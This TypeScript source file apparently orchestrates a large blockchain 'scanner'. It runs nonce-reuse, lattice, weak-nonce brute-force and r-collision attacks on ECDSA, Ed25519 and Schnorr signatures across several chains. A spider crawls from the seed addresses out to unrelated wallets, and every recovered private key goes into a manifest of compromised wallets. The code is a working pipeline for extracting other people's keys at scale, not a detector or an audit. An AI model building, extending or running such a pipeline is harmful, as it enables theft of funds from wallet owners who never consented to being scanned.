/**
 * ═══════════════════════════════════════════════════════════════════════════
 * MEGA UNIFIED BLOCKCHAIN SCANNER
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * Complete 7-phase pipeline wiring every scanning engine:
 *
 *  Phase A  ──  ECDSA Bulk Scan + Threat Scanner (parallel)
 *               BigQuery nonce-reuse on all seeds; 6-pass threat scan
 *
 *  Phase B  ──  Advanced ECDSA Attacks
 *               Lattice attack, signature bias, weak-k brute force,
 *               polynomial nonce scan, cross-address r-collision,
 *               related-nonce attack, malleability pairs, exact duplicates
 *
 *  Phase C  ──  Multi-Chain Adaptive Scan
 *               Auto-detects chain from address format:
 *                 Ethereum/EVM → already covered
 *                 Bitcoin/LTC/DOGE/BCH → secp256k1 via block explorer
 *                 Solana → Ed25519 nonce-reuse + key recovery
 *                 Polkadot/Substrate → Schnorr nonce-reuse
 *                 Monero → key-image double-spend detection
 *
 *  Phase D  ──  Adaptive Spider
 *               Seeds = original targets + threat-flagged + advanced-flagged
 *               Graph BFS with 8 concurrent workers; harvests signatures
 *               from tx/traces/logs across wave 0 → wave N
 *
 *  Phase E  ──  Deep ECDSA on Spider Discoveries
 *               Top-500 newly discovered addresses → ECDSA bulk + advanced
 *
 *  Phase F  ──  Smart Contract Analysis
 *               Fetches Solidity source for contract addresses in seed list;
 *               runs deep pattern analysis + quantum vulnerability check
 *
 *  Phase G  ──  Final Cross-Reference & Report
 *               Merges all modules, deduplicates, scores every address,
 *               builds paginated findings + recovered-key manifest
 *
 * State is checkpointed after every phase. Interrupted runs can be inspected
 * (not resumed) and re-run cleanly with reset=true.
 * ═══════════════════════════════════════════════════════════════════════════
 */

import fs   from "fs";
import path from "path";
import { logger }           from "./logger";

// ── Module imports ────────────────────────────────────────────────────────────
import { bulkScanViaBigQuery, isBigQueryConfigured }
  from "./ecdsa-analyzer/bigquery-scanner";
import { runThreatScan, type ThreatScanSummary }
  from "./threat-scanner/threat-scanner";
import { KnowledgeStore }
  from "./spider/knowledge-store";
import { runSpider, buildSpiderReport, DEFAULT_CONFIG as SPIDER_DEFAULT }
  from "./spider/blockchain-spider";
import { runAllAdvancedAttacks, detectCrossAddressRCollisions, type AdvancedScanResult }
  from "./ecdsa-analyzer/advanced-attacks";
import { scanBitcoinAddressECDSA }
  from "./ecdsa-analyzer/bitcoin-scan";
import { adaptiveScan, type AdaptiveScanResult }
  from "./scheme-auditor/adaptive-scan";
import { detectChain }
  from "./scheme-auditor/chain-detector";
import { fetchSourceCode, analyzeContractSource }
  from "./solidity-analyzer/index";
import type { WalletScanResult }
  from "./ecdsa-analyzer/nonce-recovery";
import type { TxSignatureData }
  from "./ecdsa-analyzer/advanced-attacks";

// ── Phase identifiers ─────────────────────────────────────────────────────────

export type MegaPhase =
  | "idle"
  | "phase_a_parallel"
  | "phase_b_advanced_ecdsa"
  | "phase_c_multichain"
  | "phase_d_spider"
  | "phase_e_deep_ecdsa"
  | "phase_f_contracts"
  | "phase_g_merge"
  | "complete"
  | "error";

// ── Types ─────────────────────────────────────────────────────────────────────

export interface PhaseResult {
  phase:        MegaPhase;
  label:        string;
  startedAt:    string;
  completedAt?: string;
  durationMs?:  number;
  stats:        Record<string, number>;
  skipped?:     boolean;
}

export interface MegaScanConfig {
  // Phase toggles
  skipPhaseA:    boolean;  // ECDSA bulk + threat
  skipPhaseB:    boolean;  // advanced ECDSA
  skipPhaseC:    boolean;  // multi-chain adaptive
  skipPhaseD:    boolean;  // spider crawl
  skipPhaseE:    boolean;  // deep ECDSA on spider discoveries
  skipPhaseF:    boolean;  // contract analysis
  // Spider tuning
  spiderMaxWave:     number;
  spiderConcurrency: number;
  spiderMinFreq:     number;
  spiderMaxAddresses: number;
  // Phase B tuning
  advancedBatchSize: number;  // addresses per batch for advanced attacks
  // Phase C tuning
  multiChainConcurrency: number;
  // Phase E tuning
  deepEcdsaTopN: number;   // top-N spider discoveries to deep-scan
  // Phase F tuning
  contractMaxN:  number;   // max contracts to analyse
}

export const DEFAULT_MEGA_CONFIG: MegaScanConfig = {
  skipPhaseA:    false,
  skipPhaseB:    false,
  skipPhaseC:    false,
  skipPhaseD:    false,
  skipPhaseE:    false,
  skipPhaseF:    false,
  spiderMaxWave:      2,
  spiderConcurrency:  8,
  spiderMinFreq:      2,
  spiderMaxAddresses: 50_000,
  advancedBatchSize:  50,
  multiChainConcurrency: 10,
  deepEcdsaTopN:      500,
  contractMaxN:       20,
};

export interface MegaScanState {
  runId:           string;
  startedAt:       string;
  completedAt?:    string;
  currentPhase:    MegaPhase;
  phasesCompleted: MegaPhase[];
  phaseResults:    PhaseResult[];
  running:         boolean;
  error?:          string;
  seedCount:       number;
  config:          MegaScanConfig;
  log:             string[];
}

export interface MegaFinding {
  source:    "ecdsa" | "advanced" | "threat" | "spider" | "multichain" | "contract";
  engine:    string;    // e.g. "lattice", "ed25519", "monero", "solidity"
  type:      string;
  severity:  "info" | "low" | "medium" | "high" | "critical";
  address:   string;
  title:     string;
  detail:    string;
  txHashes?: string[];
  extra?:    Record<string, unknown>;
  timestamp: string;
}

export interface MegaReport {
  state:           MegaScanState;
  totalAddresses:  number;
  totalSignatures: number;
  findings:        MegaFinding[];
  recoveredKeys:   Array<{ address: string; privateKey: string; method: string; chain: string }>;
  publicKeys:      Record<string, string>;
  topRiskAddresses: Array<{
    address:   string;
    riskScore: number;
    sources:   string[];
    findings:  number;
    chain?:    string;
    ensName?:  string;
  }>;
  moduleStats: {
    ecdsa:         Record<string, number>;
    advancedEcdsa: Record<string, number>;
    threat:        Record<string, number>;
    spider:        Record<string, number>;
    multiChain:    Record<string, number>;
    contracts:     Record<string, number>;
  };
}

// ─────────────────────────────────────────────────────────────────────────────
// MegaScanner class
// ─────────────────────────────────────────────────────────────────────────────

export class MegaScanner {
  private stateFile:  string;
  private reportFile: string;
  private state:      MegaScanState;
  private store:      KnowledgeStore;

  constructor(private baseDir: string) {
    fs.mkdirSync(baseDir, { recursive: true });
    this.stateFile  = path.join(baseDir, "mega-state.json");
    this.reportFile = path.join(baseDir, "mega-report.json");
    this.store      = new KnowledgeStore(baseDir);
    this.state      = this.makeInitialState();
  }

  private makeInitialState(): MegaScanState {
    return {
      runId:           `mega-${Date.now()}`,
      startedAt:       new Date().toISOString(),
      currentPhase:    "idle",
      phasesCompleted: [],
      phaseResults:    [],
      running:         false,
      seedCount:       0,
      config:          DEFAULT_MEGA_CONFIG,
      log:             [],
    };
  }

  // ── State I/O ──────────────────────────────────────────────────────────────

  loadState(): boolean {
    try {
      if (fs.existsSync(this.stateFile)) {
        this.state = JSON.parse(fs.readFileSync(this.stateFile, "utf8")) as MegaScanState;
        this.store.load();
        return true;
      }
    } catch {}
    return false;
  }

  private saveState(): void {
    try { fs.writeFileSync(this.stateFile, JSON.stringify(this.state, null, 2)); }
    catch (err) { logger.error({ err }, "MegaScanner: failed to save state"); }
  }

  private log(msg: string): void {
    const line = `[${new Date().toISOString()}] ${msg}`;
    this.state.log.push(line);
    if (this.state.log.length > 800) this.state.log.shift();
    logger.info(msg);
  }

  reset(): void {
    this.store.reset();
    this.state = this.makeInitialState();
    for (const f of [this.stateFile, this.reportFile]) {
      try { if (fs.existsSync(f)) fs.unlinkSync(f); } catch {}
    }
  }

  getState():  MegaScanState  { return { ...this.state }; }
  hasReport(): boolean        { return fs.existsSync(this.reportFile); }
  loadReport(): MegaReport | null {
    try {
      if (!this.hasReport()) return null;
      return JSON.parse(fs.readFileSync(this.reportFile, "utf8")) as MegaReport;
    } catch { return null; }
  }

  // ── Phase bookkeeping ──────────────────────────────────────────────────────

  private startPhase(phase: MegaPhase, label: string): PhaseResult {
    const r: PhaseResult = { phase, label, startedAt: new Date().toISOString(), stats: {} };
    this.state.currentPhase = phase;
    this.state.phaseResults.push(r);
    this.log(`╔══ ${phase} — ${label}`);
    this.saveState();
    return r;
  }

  private endPhase(r: PhaseResult, stats: Record<string, number>, skipped = false): void {
    r.completedAt = new Date().toISOString();
    r.durationMs  = Date.now() - new Date(r.startedAt).getTime();
    r.stats       = stats;
    r.skipped     = skipped;
    this.state.phasesCompleted.push(r.phase);
    const tag = skipped ? "SKIPPED" : `${(r.durationMs / 1000).toFixed(1)}s`;
    this.log(`╚══ ${r.phase} done (${tag}) — ${JSON.stringify(stats)}`);
    this.saveState();
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // MAIN RUN
  // ═══════════════════════════════════════════════════════════════════════════

  async run(
    seeds:       string[],
    config:      MegaScanConfig = DEFAULT_MEGA_CONFIG,
    onProgress?: (state: MegaScanState) => void,
  ): Promise<void> {
    if (this.state.running) { this.log("Already running — ignoring"); return; }

    this.state.running    = true;
    this.state.startedAt  = new Date().toISOString();
    this.state.seedCount  = seeds.length;
    this.state.config     = config;
    this.state.error      = undefined;
    this.state.phasesCompleted = [];
    this.state.phaseResults    = [];
    this.state.log             = [];
    this.saveState();

    const notify = (): void => onProgress?.(this.getState());

    // ── Accumulator buckets (shared across phases) ────────────────────────
    let ecdsaResults:    WalletScanResult[]        = [];
    let threatSummary:   ThreatScanSummary | null  = null;
    let advancedResults: AdvancedScanResult[]      = [];
    const allSigsByAddress = new Map<string, TxSignatureData[]>();
    let extraSpiderSeeds: string[]                 = [];
    let multiChainResults: Array<{
      address: string; chain: string; result: AdaptiveScanResult | null;
      vulnerabilities: number; keys: string[];
    }> = [];
    let contractFindings: Array<{
      address: string; findings: Array<{ title: string; severity: string; detail: string }>;
    }> = [];

    try {

      // ╔══════════════════════════════════════════════════════════════════════
      // PHASE A — ECDSA Bulk Scan + Threat Scanner (parallel)
      // ╚══════════════════════════════════════════════════════════════════════
      {
        const phase = this.startPhase("phase_a_parallel", `ECDSA bulk nonce-reuse (BigQuery) + 6-pass threat scan on ${seeds.length} seeds`);
        notify();

        if (config.skipPhaseA) {
          this.endPhase(phase, {}, true);
        } else {
          let ecdsaVuln = 0, ecdsaKeys = 0;
          let threatCrit = 0, threatHigh = 0;
          const tasks: Promise<void>[] = [];

          // ── ECDSA bulk ────────────────────────────────────────────────────
          tasks.push(
            bulkScanViaBigQuery(
              seeds,
              (done, total) => { this.log(`  [ECDSA] ${done}/${total} addresses scanned`); notify(); },
              (result) => {
                ecdsaResults.push(result);
                if (result.hasVulnerability) ecdsaVuln++;
                if ((result.recoveredKeys?.length ?? 0) > 0) ecdsaKeys++;
                // Accumulate sigs for Phase B cross-address analysis
                if (result.allSignatures?.length) {
                  allSigsByAddress.set(result.address.toLowerCase(), result.allSignatures);
                }
              },
              true,
            ).then(r => {
              ecdsaResults = r;
              this.log(`  [ECDSA] complete — ${ecdsaVuln} vulnerable, ${ecdsaKeys} keys recovered`);
            }).catch(err => this.log(`  [ECDSA] error (continuing): ${String(err)}`)),
          );

          // ── Threat scan ───────────────────────────────────────────────────
          tasks.push(
            runThreatScan(seeds, (phaseLabel, pct) => {
              this.log(`  [Threat] ${phaseLabel} (${pct}%)`); notify();
            }).then(summary => {
              threatSummary = summary;
              threatCrit = summary.riskBreakdown.critical ?? 0;
              threatHigh = summary.riskBreakdown.high     ?? 0;
              extraSpiderSeeds = summary.highRiskAddresses.map(p => p.address);
              this.log(`  [Threat] complete — ${threatCrit} critical, ${threatHigh} high → ${extraSpiderSeeds.length} flagged for spider`);
            }).catch(err => this.log(`  [Threat] error (continuing): ${String(err)}`)),
          );

          await Promise.all(tasks);
          this.endPhase(phase, {
            ecdsaAddresses:    ecdsaResults.length,
            ecdsaVulnerable:   ecdsaVuln,
            ecdsaKeysRecovered: ecdsaKeys,
            sigsAccumulated:   allSigsByAddress.size,
            threatCritical:    threatCrit,
            threatHigh,
            extraSpiderSeeds:  extraSpiderSeeds.length,
          });
          notify();
        }
      }

      // ╔══════════════════════════════════════════════════════════════════════
      // PHASE B — Advanced ECDSA Attacks (8 attack types)
      // ╚══════════════════════════════════════════════════════════════════════
      {
        const candidates = ecdsaResults.filter(r => (r.allSignatures?.length ?? 0) >= 2);
        const phase = this.startPhase("phase_b_advanced_ecdsa",
          `8-vector deep ECDSA attack on ${candidates.length} addresses with ≥2 signatures`);
        notify();

        if (config.skipPhaseB || candidates.length === 0) {
          this.endPhase(phase, { candidates: candidates.length }, candidates.length === 0);
        } else {
          let advKeys = 0, advFindings = 0, processed = 0;

          // Process in batches
          const bs = config.advancedBatchSize;
          for (let i = 0; i < candidates.length; i += bs) {
            const batch = candidates.slice(i, i + bs);
            const batchResults = await Promise.all(
              batch.map(r =>
                runAllAdvancedAttacks(r.address, r.allSignatures!, allSigsByAddress)
                  .catch(err => {
                    this.log(`  [Advanced] ${r.address.slice(0,12)}: ${String(err)}`);
                    return null;
                  })
              ),
            );
            for (const res of batchResults) {
              if (!res) continue;
              advancedResults.push(res);
              advFindings += res.findings.length;
              advKeys     += res.keysFound.length;
              processed++;
              // Flag addresses with advanced findings as extra spider seeds
              if (res.findings.length > 0) extraSpiderSeeds.push(res.address);
            }
            this.log(`  [Advanced] batch ${Math.floor(i / bs) + 1}/${Math.ceil(candidates.length / bs)} — ${processed} done, ${advKeys} keys, ${advFindings} findings`);
            notify();
          }

          // Cross-address r-collision across ALL accumulated sigs
          let crossCollisions = 0;
          if (allSigsByAddress.size > 1) {
            const crossFindings = detectCrossAddressRCollisions(allSigsByAddress);
            crossCollisions = crossFindings.length;
            this.log(`  [Advanced] cross-address r-collision: ${crossCollisions} hits`);
            // Inject cross-collision findings into first matching result or a synthetic one
            for (const f of crossFindings) {
              const existing = advancedResults.find(r => r.address === f.address);
              if (existing) { existing.findings.push(f); existing.keysFound.push(...(f.privateKey ? [f.privateKey] : [])); }
              else advancedResults.push({ address: f.address, sigCount: 0, biasReport: {} as any, findings: [f], keysFound: f.privateKey ? [f.privateKey] : [] });
            }
          }

          this.endPhase(phase, {
            addressesAnalyzed: processed,
            totalFindings:     advFindings,
            keysRecovered:     advKeys,
            crossAddressHits:  crossCollisions,
          });
          notify();
        }
      }

      // ╔══════════════════════════════════════════════════════════════════════
      // PHASE C — Multi-Chain Adaptive Scan
      //   Auto-detects chain from address format and routes accordingly
      // ╚══════════════════════════════════════════════════════════════════════
      {
        // Separate seeds by chain type
        const nonEthSeeds = seeds.filter(s => {
          const chains = detectChain(s);
          const primary = chains[0]?.chain ?? "unknown";
          return !["ethereum", "bsc", "polygon", "arbitrum", "optimism", "avalanche", "unknown"].includes(primary)
            && !s.startsWith("0x");
        });

        const phase = this.startPhase("phase_c_multichain",
          `Adaptive multi-chain scan: ${nonEthSeeds.length} non-EVM addresses (Bitcoin, Solana, Polkadot, Monero)`);
        notify();

        if (config.skipPhaseC || nonEthSeeds.length === 0) {
          this.endPhase(phase, { nonEthSeeds: nonEthSeeds.length }, config.skipPhaseC || nonEthSeeds.length === 0);
        } else {
          let mcVuln = 0, mcKeys = 0;
          const conc = config.multiChainConcurrency;

          for (let i = 0; i < nonEthSeeds.length; i += conc) {
            const batch = nonEthSeeds.slice(i, i + conc);
            const batchResults = await Promise.all(
              batch.map(async (addr) => {
                const chains = detectChain(addr);
                const primary = chains[0]?.chain ?? "unknown";
                try {
                  const result = await adaptiveScan(addr, primary);
                  const keys = extractKeysFromAdaptive(result);
                  return { address: addr, chain: primary, result, vulnerabilities: result.vulnerabilityCount, keys };
                } catch (err) {
                  this.log(`  [MultiChain] ${addr.slice(0,16)}: ${String(err)}`);
                  return { address: addr, chain: primary, result: null, vulnerabilities: 0, keys: [] as string[] };
                }
              }),
            );
            for (const r of batchResults) {
              multiChainResults.push(r);
              mcVuln += r.vulnerabilities;
              mcKeys += r.keys.length;
            }
            this.log(`  [MultiChain] ${Math.min(i + conc, nonEthSeeds.length)}/${nonEthSeeds.length} — ${mcVuln} vulnerable, ${mcKeys} keys`);
            notify();
          }

          this.endPhase(phase, {
            addressesScanned: nonEthSeeds.length,
            vulnerable:       mcVuln,
            keysRecovered:    mcKeys,
          });
          notify();
        }
      }

      // ╔══════════════════════════════════════════════════════════════════════
      // PHASE D — Adaptive Spider
      //   Seeds = original + threat-flagged + advanced-flagged
      // ╚══════════════════════════════════════════════════════════════════════
      {
        const allSeeds = [...new Set([
          ...seeds,
          ...extraSpiderSeeds,
          ...advancedResults.filter(r => r.findings.length > 0).map(r => r.address),
        ])];

        const phase = this.startPhase("phase_d_spider",
          `Adaptive spider — ${allSeeds.length} seeds (original + threat + advanced) → wave 0–${config.spiderMaxWave}`);
        notify();

        if (config.skipPhaseD) {
          this.endPhase(phase, {}, true);
        } else {
          this.store.load();
          let spiderWave = 0;

          await runSpider(
            this.store,
            allSeeds,
            {
              ...SPIDER_DEFAULT,
              maxWave:        config.spiderMaxWave,
              maxAddresses:   config.spiderMaxAddresses,
              concurrency:    config.spiderConcurrency,
              minFrequency:   config.spiderMinFreq,
              resumeIfExists: false,
            },
            (ev) => {
              spiderWave = ev.wave;
              this.log(`  [Spider] ${ev.phase} wave=${ev.wave} visited=${ev.visited} sigs=${ev.signatures} keys=${ev.publicKeys} — ${ev.message}`);
              notify();
            },
          );

          const ss = this.store.getState();
          this.endPhase(phase, {
            wavesCompleted:      spiderWave,
            addressesVisited:    ss.totalVisited,
            signaturesHarvested: ss.totalSignatures,
            spiderFindings:      ss.totalFindings,
            publicKeysExtracted: this.store.getPublicKeyMap().size,
          });
          notify();
        }
      }

      // ╔══════════════════════════════════════════════════════════════════════
      // PHASE E — Deep ECDSA on Spider-Discovered Addresses
      // ╚══════════════════════════════════════════════════════════════════════
      {
        const seedSet = new Set(seeds.map(a => a.toLowerCase()));
        const topDiscovered = this.store
          .getTopAddressesByFreq(config.deepEcdsaTopN)
          .filter(m => !seedSet.has(m.address) && m.sigCount >= 2)
          .map(m => m.address);

        const phase = this.startPhase("phase_e_deep_ecdsa",
          `Deep ECDSA (bulk + advanced) on ${topDiscovered.length} spider-discovered addresses`);
        notify();

        if (config.skipPhaseE || topDiscovered.length === 0) {
          this.endPhase(phase, { discovered: topDiscovered.length }, config.skipPhaseE || topDiscovered.length === 0);
        } else {
          let deVuln = 0, deKeys = 0;
          const deepResults: WalletScanResult[] = [];

          await bulkScanViaBigQuery(
            topDiscovered,
            (done, total) => { this.log(`  [DeepECDSA] ${done}/${total}`); notify(); },
            (result) => {
              deepResults.push(result);
              if (result.hasVulnerability) deVuln++;
              if ((result.recoveredKeys?.length ?? 0) > 0) deKeys++;
              if (result.allSignatures?.length) {
                allSigsByAddress.set(result.address.toLowerCase(), result.allSignatures);
              }
            },
            true,
          ).catch(err => this.log(`  [DeepECDSA] bulk error (continuing): ${String(err)}`));

          // Advanced attacks on deep results
          let deAdvKeys = 0;
          const deepCandidates = deepResults.filter(r => (r.allSignatures?.length ?? 0) >= 2);
          for (let i = 0; i < deepCandidates.length; i += config.advancedBatchSize) {
            const batch = deepCandidates.slice(i, i + config.advancedBatchSize);
            const brs = await Promise.all(
              batch.map(r => runAllAdvancedAttacks(r.address, r.allSignatures!, allSigsByAddress)
                .catch(() => null)),
            );
            for (const res of brs) {
              if (!res) continue;
              advancedResults.push(res);
              deAdvKeys += res.keysFound.length;
            }
          }

          this.endPhase(phase, {
            addressesScanned:  deepResults.length,
            newVulnerabilities: deVuln,
            newKeysFromBulk:   deKeys,
            newKeysFromAdvanced: deAdvKeys,
          });
          notify();
        }
      }

      // ╔══════════════════════════════════════════════════════════════════════
      // PHASE F — Smart Contract Source Analysis
      //   Identifies contract addresses in seed list and runs Solidity analysis
      // ╚══════════════════════════════════════════════════════════════════════
      {
        // Use threat scanner findings to identify contract-related addresses
        const contractAddrs = (threatSummary?.highRiskAddresses ?? [])
          .filter(p => p.findings.some(f =>
            ["bridge", "flash_loan", "exploit_contract", "token_drainer", "governance"].includes(f.category)))
          .map(p => p.address)
          .slice(0, config.contractMaxN);

        const phase = this.startPhase("phase_f_contracts",
          `Smart contract analysis on ${contractAddrs.length} contract addresses`);
        notify();

        if (config.skipPhaseF || contractAddrs.length === 0) {
          this.endPhase(phase, { contractAddresses: contractAddrs.length }, config.skipPhaseF || contractAddrs.length === 0);
        } else {
          let contractsAnalyzed = 0, contractFinds = 0;

          for (const addr of contractAddrs) {
            try {
              const src = await fetchSourceCode(addr, "ethereum");
              if (!src?.source) continue;

              const report = await analyzeContractSource(addr, "ethereum", src.source, src.compilerVersion);
              const mapped = (report.findings ?? []).map(f => ({
                title:    f.name,
                severity: f.severity,
                detail:   f.description ?? "",
              }));
              contractFindings.push({ address: addr, findings: mapped });
              contractsAnalyzed++;
              contractFinds += mapped.length;
              this.log(`  [Contract] ${addr.slice(0,14)}: ${src.contractName} → ${mapped.length} findings`);
            } catch (err) {
              this.log(`  [Contract] ${addr.slice(0,14)}: ${String(err)}`);
            }
            notify();
          }

          this.endPhase(phase, {
            contractsAnalyzed,
            totalFindings:  contractFinds,
          });
          notify();
        }
      }

      // ╔══════════════════════════════════════════════════════════════════════
      // PHASE G — Cross-Reference & Final Report
      // ╚══════════════════════════════════════════════════════════════════════
      {
        const phase = this.startPhase("phase_g_merge", "Cross-referencing all modules and building final report");
        notify();

        const report = this.buildReport(seeds, ecdsaResults, advancedResults, threatSummary, multiChainResults, contractFindings);
        fs.writeFileSync(this.reportFile, JSON.stringify(report, null, 2));

        this.endPhase(phase, {
          totalFindings:     report.findings.length,
          recoveredKeys:     report.recoveredKeys.length,
          publicKeys:        Object.keys(report.publicKeys).length,
          topRiskAddresses:  report.topRiskAddresses.length,
        });
        notify();
      }

      this.state.currentPhase = "complete";
      this.state.completedAt  = new Date().toISOString();
      this.state.running      = false;
      this.log(`✔ MEGA SCAN COMPLETE`);
      this.saveState();
      notify();

    } catch (err) {
      this.state.currentPhase = "error";
      this.state.error        = String(err);
      this.state.running      = false;
      this.log(`✘ FATAL: ${String(err)}`);
      this.saveState();
      notify();
      throw err;
    }
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // REPORT BUILDER
  // ═══════════════════════════════════════════════════════════════════════════

  private buildReport(
    seeds:          string[],
    ecdsaResults:   WalletScanResult[],
    advancedResults: AdvancedScanResult[],
    threat:         ThreatScanSummary | null,
    multiChain:     Array<{ address: string; chain: string; result: AdaptiveScanResult | null; vulnerabilities: number; keys: string[] }>,
    contracts:      Array<{ address: string; findings: Array<{ title: string; severity: string; detail: string }> }>,
  ): MegaReport {
    const findings: MegaFinding[] = [];
    const recoveredKeys: MegaReport["recoveredKeys"] = [];
    const seen = new Set<string>();

    const addFinding = (f: MegaFinding) => {
      const key = `${f.source}:${f.engine}:${f.type}:${f.address}:${f.txHashes?.[0] ?? f.title}`;
      if (seen.has(key)) return;
      seen.add(key);
      findings.push(f);
    };

    const addKey = (address: string, privateKey: string, method: string, chain: string) => {
      if (!recoveredKeys.some(k => k.privateKey === privateKey)) {
        recoveredKeys.push({ address, privateKey, method, chain });
      }
    };

    // ── ECDSA Phase A ─────────────────────────────────────────────────────
    const ecdsaStats: Record<string, number> = { addresses: ecdsaResults.length, vulnerable: 0, keys: 0, nonceReusePairs: 0 };
    for (const r of ecdsaResults) {
      if (r.hasVulnerability) ecdsaStats.vulnerable++;
      for (const pair of r.nonceReusePairs ?? []) {
        ecdsaStats.nonceReusePairs++;
        addFinding({
          source: "ecdsa", engine: "nonce-reuse", type: "nonce_reuse", severity: "critical", address: r.address,
          title: "ECDSA nonce reuse", detail: `Identical r-value: tx ${pair.tx1.hash.slice(0,14)}… and ${pair.tx2.hash.slice(0,14)}…`,
          txHashes: [pair.tx1.hash, pair.tx2.hash], extra: { r: pair.r }, timestamp: new Date().toISOString(),
        });
      }
      for (const key of r.recoveredKeys ?? []) {
        ecdsaStats.keys++;
        addKey(r.address, key, "ecdsa-nonce-reuse", "ethereum");
        addFinding({
          source: "ecdsa", engine: "key-recovery", type: "private_key_recovered", severity: "critical", address: r.address,
          title: "Private key recovered (ECDSA nonce reuse)", detail: "Full secp256k1 private key derived from duplicate nonce — wallet fully compromised",
          extra: { privateKey: key }, timestamp: new Date().toISOString(),
        });
      }
    }

    // ── Advanced ECDSA Phase B ────────────────────────────────────────────
    const advStats: Record<string, number> = { addresses: 0, findings: 0, keys: 0 };
    const ENGINE_MAP: Record<string, string> = {
      bias:              "signature-bias",
      lattice:           "lattice-attack",
      weak_k:            "weak-k-bruteforce",
      related_nonce:     "related-nonce",
      malleability:      "malleable-sig",
      r_collision:       "r-collision",
      cross_address:     "cross-addr-r-collision",
      exact_duplicate:   "exact-duplicate",
    };
    for (const r of advancedResults) {
      advStats.addresses++;
      for (const f of r.findings) {
        advStats.findings++;
        const engine = ENGINE_MAP[f.type] ?? f.type;
        addFinding({
          source: "advanced", engine,
          type: f.type, severity: f.severity as MegaFinding["severity"],
          address: f.address, title: `Advanced: ${engine.replace(/-/g, " ")}`, detail: f.detail,
          txHashes: [f.txHash1, ...(f.txHash2 ? [f.txHash2] : [])].filter(Boolean),
          extra: f.privateKey ? { privateKey: f.privateKey, verified: f.verified } : { verified: f.verified },
          timestamp: new Date().toISOString(),
        });
      }
      for (const key of r.keysFound) {
        advStats.keys++;
        addKey(r.address, key, "advanced-ecdsa", "ethereum");
      }
    }

    // ── Threat Scanner Phase A ────────────────────────────────────────────
    const threatStats: Record<string, number> = { critical: 0, high: 0, medium: 0, findings: 0 };
    if (threat) {
      threatStats.critical = threat.riskBreakdown.critical ?? 0;
      threatStats.high     = threat.riskBreakdown.high     ?? 0;
      threatStats.medium   = threat.riskBreakdown.medium   ?? 0;
      for (const profile of threat.highRiskAddresses) {
        for (const f of profile.findings) {
          threatStats.findings++;
          addFinding({
            source: "threat", engine: f.category ?? "threat-scanner",
            type: f.category, severity: f.severity, address: profile.address,
            title: f.title, detail: f.detail,
            txHashes: f.txHash ? [f.txHash] : undefined,
            extra: { counterpartyName: f.counterpartyName, valueETH: f.valueETH, lossUSD: f.lossUSD },
            timestamp: f.timestamp ?? new Date().toISOString(),
          });
        }
      }
    }

    // ── Spider Phase D ────────────────────────────────────────────────────
    const spiderReport = buildSpiderReport(this.store);
    const spiderStats: Record<string, number> = {
      visited: spiderReport.state.totalVisited,
      signatures: spiderReport.state.totalSignatures,
      findings: spiderReport.state.totalFindings,
      publicKeys: Object.keys(spiderReport.publicKeys).length,
    };
    for (const f of spiderReport.findings) {
      addFinding({
        source: "spider", engine: "adaptive-spider",
        type: f.type, severity: (f.severity ?? "high") as MegaFinding["severity"],
        address: f.address, title: `Spider: ${f.type.replace(/_/g, " ")}`, detail: f.detail,
        txHashes: f.txHashes, extra: f.extra as Record<string, unknown>,
        timestamp: f.timestamp,
      });
    }
    for (const key of spiderReport.recoveredKeys) {
      const addr = spiderReport.findings.find(f => (f.extra as any)?.recoveredKey === key)?.address ?? "unknown";
      addKey(addr, key, "spider-nonce-reuse", "ethereum");
    }

    // ── Multi-Chain Phase C ───────────────────────────────────────────────
    const mcStats: Record<string, number> = { addresses: 0, vulnerable: 0, keys: 0 };
    for (const mc of multiChain) {
      mcStats.addresses++;
      if (mc.vulnerabilities > 0) {
        mcStats.vulnerable++;
        addFinding({
          source: "multichain", engine: mc.chain,
          type: `${mc.chain}_vulnerability`, severity: "critical",
          address: mc.address, title: `${mc.chain.toUpperCase()} vulnerability detected`,
          detail: `${mc.vulnerabilities} vulnerability${mc.vulnerabilities !== 1 ? "ies" : ""} found via ${mc.chain} scanner`,
          timestamp: new Date().toISOString(),
        });
      }
      for (const key of mc.keys) {
        mcStats.keys++;
        addKey(mc.address, key, `${mc.chain}-scan`, mc.chain);
      }
    }

    // ── Contract Phase F ──────────────────────────────────────────────────
    const contractStats: Record<string, number> = { contracts: 0, findings: 0 };
    for (const c of contracts) {
      contractStats.contracts++;
      for (const f of c.findings) {
        contractStats.findings++;
        addFinding({
          source: "contract", engine: "solidity-analyzer",
          type: "contract_vulnerability",
          severity: (f.severity ?? "medium") as MegaFinding["severity"],
          address: c.address, title: f.title, detail: f.detail,
          timestamp: new Date().toISOString(),
        });
      }
    }

    // ── Rank + sort ───────────────────────────────────────────────────────
    const sevWeight = { critical: 100, high: 50, medium: 20, low: 8, info: 2 };
    const addrMap = new Map<string, { score: number; sources: Set<string>; count: number }>();
    for (const f of findings) {
      const a = f.address.toLowerCase();
      const e = addrMap.get(a) ?? { score: 0, sources: new Set<string>(), count: 0 };
      e.score += sevWeight[f.severity] ?? 0;
      e.sources.add(`${f.source}/${f.engine}`);
      e.count++;
      addrMap.set(a, e);
    }

    const topRiskAddresses = [...addrMap.entries()]
      .sort(([, a], [, b]) => b.score - a.score)
      .slice(0, 150)
      .map(([address, data]) => ({
        address,
        riskScore: Math.min(100, Math.round(data.score / 10)),
        sources:   [...data.sources],
        findings:  data.count,
        ensName:   this.store.getEns(address),
        chain:     "ethereum",
      }));

    findings.sort((a, b) => (sevWeight[b.severity] ?? 0) - (sevWeight[a.severity] ?? 0));

    return {
      state:           this.getState(),
      totalAddresses:  seeds.length,
      totalSignatures: spiderReport.state.totalSignatures,
      findings,
      recoveredKeys,
      publicKeys:      spiderReport.publicKeys,
      topRiskAddresses,
      moduleStats: {
        ecdsa:         ecdsaStats,
        advancedEcdsa: advStats,
        threat:        threatStats,
        spider:        spiderStats,
        multiChain:    mcStats,
        contracts:     contractStats,
      },
    };
  }
}

// ── Helper: extract keys from AdaptiveScanResult ──────────────────────────────
function extractKeysFromAdaptive(r: AdaptiveScanResult): string[] {
  if (!r || !r.result) return [];
  const res = r.result as any;
  const keys: string[] = [];
  if (Array.isArray(res.recoveredKeys))   keys.push(...res.recoveredKeys);
  if (typeof res.recoveredPrivateKey === "string") keys.push(res.recoveredPrivateKey);
  if (Array.isArray(res.reusePairs)) {
    for (const pair of res.reusePairs) {
      if (pair.recoveredKey) keys.push(pair.recoveredKey);
    }
  }
  return [...new Set(keys.filter(Boolean))];
}

// ── Legacy export: UnifiedScanner = MegaScanner ──────────────────────────────
// Keeps backward-compat with existing /unified/* routes
